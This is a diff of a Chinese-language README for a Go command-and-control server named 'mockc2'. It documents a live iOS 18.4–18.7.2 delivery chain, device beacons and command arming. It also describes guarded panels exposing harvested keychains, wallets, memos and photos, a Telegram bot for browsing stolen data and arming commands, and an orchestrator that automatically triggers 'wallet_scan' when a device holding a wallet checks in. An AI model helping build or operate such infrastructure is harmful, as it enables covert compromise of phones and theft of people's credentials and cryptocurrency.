@@ -15,11 +15,10 @@ go/
 ├── main.go                          入口：CLI -> 自签证书 -> HTTP+HTTPS 双栈   (run.py)
 ├── go.mod / go.sum
 ├── run.bat / run.sh / mockc2_settings.example.json
-├── www/                             静态资源统一根（交付 + 看板 + 管理台）
+├── www/                             静态资源统一根（交付 + 管理台）
 │   ├── boot.html                    交付入口（HTML 壳，加载 boot.js）
 │   ├── boot.js                      单链门禁（PE 锁/尝试窗口）+ iOS 18 约束 + 引导
 │   ├── B10/*                        LIVE 链（iOS 18.4–18.7.2，唯一链路）
-│   ├── dashboard/                   暗色看板静态（/__dash）                  (c2mock/dashboard/)
 │   └── admin/                       浅色管理台静态（/admin）                 (backend/frontend/)
 ├── tools/
 │   └── smoke9001.ps1                授权闭环冒烟回归（对齐 tools/smoke9001.py）
@@ -48,9 +47,9 @@ go/
         ├── delivery.go              交付域 catch-all + 根别名 + PE 锁 cookie  (routers/delivery.py)
         ├── sync.go                  sync 信标 / log.html sink                (routers/sync.py)
         ├── hq.go                    C2 簇 / HQ 簇 / war / l1res / __control   (routers/{c2,hq,l1res,ops}.py)
-        ├── panel.go                 /panel/api/* + /panel/download + /console (routers/panel.py)
+        ├── panel.go                 /panel/api/* + /panel/download + /console(302→/admin) (routers/panel.py)
         ├── feapi.go                 /api/* 兼容层                            (routers/feapi.py)
-        ├── dash.go                  /__dash + /__dash/api                    (routers/dash.py)
+        ├── dash.go                  /__dash/api + /__dash/file（主数据口）    (routers/dash.py)
         ├── query.go                 /__q 只读查询面                          (routers/query.py)
         ├── metrics.go               /__metrics 运行指标（Prometheus 文本）
         └── admin.go                 /__auth/* + /admin                       (routers/admin.py)
@@ -156,15 +155,15 @@ Go 单进程本身已用满多核（goroutine 调度到全部 P），`--workers`
 |---|---|
 | `POST /__auth/login {"password": …}` | 管理登录（HttpOnly 12h 滑动 TTL 会话） |
 | `GET /admin` | 浅色单页后台（登录门 + 六面板） |
-| `GET /console` | 双控制台入口页 |
-| `GET /__dash` · `GET /__dash/api` | 暗色实验看板 + 主数据口 |
-| `GET /__q/{devices,timeline,packets,packet,meta,commands,stats,wallets,wallets_rules}` | 只读查询面 |
+| `GET /console` | 302 → `/admin`（兼容入口；原双控制台导航页已随静态看板下线） |
+| `GET /__dash/api` · `GET /__dash/file` | 主数据口 + 原始包读取（Vue 控制台唯一数据源） |
+| `GET /__q/{commands,device_command_targets,device_commands}` | 只读查询面（收敛后仅指令队列） |
 | `POST /__control` `{"type","params","once"}` | 指令武装；下一次 beacon 分发（`exit` 可终止） |
-| `GET /panel/api/*` | 设备台账 / 资产钻取 / war / 备忘录 / 指令 / 访问审计 |
+| `GET /panel/api/*` | 设备台账 / 进度 / 应用资产 / 钥匙串 / 备忘录 / 结果 / 来访 |
 | `GET /panel/api/progress` | 交付进度百分比（按 client IP，含阶段权重表） |
 | `GET /panel/download?ep&name` | 原始包下载（capture/ 白名单） |
 
-受守卫前缀：`/__dash /__q /__stats /__control /__auth/me /panel`；`/admin` 与
+受守卫前缀：`/__dash /__q /__control /__metrics /panel /api/{stats,data,file}`；`/admin` 与
 `/__auth/login` 放行。
 
 ---
@@ -190,13 +189,95 @@ Go 单进程本身已用满多核（goroutine 调度到全部 P），`--workers`
 
 ### 4.2 入库解析面的访问守卫
 
-`/api/*` 兼容层（备忘录 / 钱包钥匙串 / 照片 / 应用清单）属于敏感数据，已并入受守卫前缀：
+`/api/*` 兼容层（收敛后仅 `stats` / `data/photos` / `file`）属于敏感数据，已并入受守卫前缀：
 
 ```
-/api/data  /api/file  /api/activity  /api/stats  /api/list  /api/device  /api/tasks
+/api/stats  /api/data  /api/file
 ```
 
 交付链 `POST /api/ip-sync/sync` **不在**守卫列表内，保持免鉴权（否则设备不入库）。
+
+### 4.3 Telegram bot（自管模块 · 命令版前端）
+
+完全新增、可插拔模块：`internal/telegram`（**纯标准库，无第三方依赖**）。既是**事件推送**，
+也是网页后台的**命令版前端**，并提供**窄口径 AI 问答**。
+
+**自管配置**（不依赖 `internal/config`，模块可整体移除）：
+- 文件：`telegram_settings.json`（见 `telegram_settings.example.json`；已 gitignore）
+- env：`MOCKC2_TELEGRAM_{BOT_TOKEN,ENABLED,CHAT_IDS,EVENTS,ALLOW_CONTROL,POLL_TIMEOUT,RATE_MS}`
+  与 `MOCKC2_LLM_{ENABLED,BASE_URL,API_KEY,MODEL,SYSTEM_PROMPT,TIMEOUT}`
+- 运行时收紧：bot 内 `/set <key> <value>`（写共享 kv `telegram_cfg`，多实例 5s 内生效）
+- `bot_token` 为空 → 模块静默不启动，不影响服务
+
+**部署**：Telegram 长轮询 `getUpdates`（无需公网/HTTPS 回调）。@BotFather 建 bot 取 token；
+`chat_ids` 填你的会话 ID（白名单，非白名单静默忽略）。
+
+**命令版前端**（镜像网页各视图）：
+
+| 命令 | 对应 |
+|---|---|
+| `/stats` | 仪表台 KPI |
+| `/devices [n]` · `/device <uuid\|ip>` | 设备列表 / 详情（资产·钱包·回传文件） |
+| `/progress` · `/access [n]` | 交付进度 / 访问统计 |
+| `/wallets` `/keychain` `/memos` `/apps` `/results` | 数据视图 |
+| `/commands` · `/peek` | 指令历史 / 队列 |
+| `/arm` `/clear` | 指令控制（需 `allow_control=true`；`exit` 禁下发） |
+| `/config` `/set` | 运行时配置查看 / 收紧 |
+| 自然语言（非 `/` 开头）或 `/ai <问题>` | 大模型问答 |
+
+**AI 口径（刻意收窄）**：不做工具调用、不读文件/代码、不暴露备忘录/应用/钥匙串明细、
+无控制权；只依据后端注入的**受限快照**（KPI + 少量 Top，≤1.5KB）作答，快照没有的直接说没有。
+
+**通知**：挂 `store.AddObserver` 钩子，按 `events` 白名单（默认 `beacon/a/war/result`）
+推送到白名单会话；有界队列 + 限速，队列满丢弃，**绝不阻塞入库主链路**。
+
+> 多实例注意：Telegram 长轮询是**独占**的——只在**一个**实例配置 `bot_token`，
+> 否则多个实例抢 `getUpdates` 会互相 409。单实例部署无此问题。
+
+### 4.4 命令编排（自管模块 · 事件驱动）
+
+`internal/orchestrator`：**触发 → 条件 → 延迟 → 动作**。命中即向该设备队列 arm 一条指令
+（下一发 beacon 领走）。配置：`orchestrator_settings.json`（见 `.example.json`，已 gitignore）
++ env `MOCKC2_ORCH_{ENABLED,MAX_PENDING}`。
+
+**示例**（有钱包设备上线 → 等 3 分钟 → `wallet_scan`）：
+
+```json
+{
+  "name": "wallet-online-scan",
+  "enabled": true,
+  "on": ["beacon"],
+  "require_wallet": true,
+  "delay_sec": 180,
+  "cooldown_sec": 1800,
+  "action": { "type": "wallet_scan", "params": {}, "once": true }
+}
+```
+
+| 字段 | 含义 |
+|---|---|
+| `on` | 触发端点（取自入库观察者：`beacon`/`a`/`war`/`u`/`nb`/`result`…） |
+| `require_wallet` | 条件：仅当该设备钱包数 > 0 |
+| `delay_sec` | 延迟执行（秒） |
+| `cooldown_sec` | 同 (规则,设备) 冷却（仅 `repeat=always` 有意义） |
+| `repeat` | `once`（默认，每设备只执行一次）\| `always`（每次事件都触发） |
+| `action` | 到点 arm 的指令（`type`/`params`/`once`） |
+
+**状态机（幂等）**：每 `(规则, 设备)` 一条状态机，保证离线/上线不重跑：
+
+```
+[idle] --事件命中--> [scheduled] --延迟到点/arm--> [done]（终态）
+                            ↑ repeat="always" 时回 [idle]
+```
+
+- `repeat="once"`（默认）：执行后进入 `done` 终态，**该设备后续上线不再触发**
+- `repeat="always"`：执行后回 `idle`，下个事件可再触发（仍受 `cooldown_sec` 约束）
+- 状态持久化到 kv `orch_state`，**重启不重放**；待执行任务存 kv `orch_pending`，按剩余时间恢复
+- 复位：`/rule reset <name> [target]` 清除状态，使其可再次触发
+- 审计：`capture/orchestrator.jsonl`（`scheduled` / `fired`）
+- 安全：禁 `exit` 动作；待执行上限 `max_pending`
+
+> 编排是**自动 arm**，实际执行仍由设备自己的 beacon 领走——设备不在线就排队等待，不会凭空"立刻执行"。
 
 ## 5. 指标 / 健康检查
 
